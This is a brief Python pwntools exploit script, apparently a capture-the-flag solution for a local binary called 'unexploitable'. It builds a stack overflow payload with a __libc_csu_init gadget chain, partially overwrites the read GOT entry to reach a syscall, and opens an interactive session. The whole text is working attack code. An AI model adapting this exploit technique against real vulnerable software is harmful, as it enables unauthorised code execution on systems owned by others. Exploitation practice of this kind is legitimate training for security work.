from pwn import *

p = process('./unexploitable')
e= ELF('./unexploitable')

log.info('plt : ' +  str(e.plt.keys()))
pause()
context.log_level = "debug"

main = 0x400544
csu_1 = 0x4005E6
csu_2 = 0x4005D0

payload = 'a' * 0x10 + 'b' * 8

### csu ###
payload += p64(csu_1)
payload += p64(0) #dummy
payload += p64(0) + p64(1)
payload += p64(e.got['read']) # execute this
payload += p64(0)
payload += p64(e.got['read']) # rsi
payload += p64(0x1000) # rdx
payload += p64(csu_2)
##########

payload += 'a' * 0x38
payload += p64(main)

p.send(payload)

### read -> syscall ##
p.send('\x5e')
#####################

log.info(hex(e.plt['read']))

p.interactive()
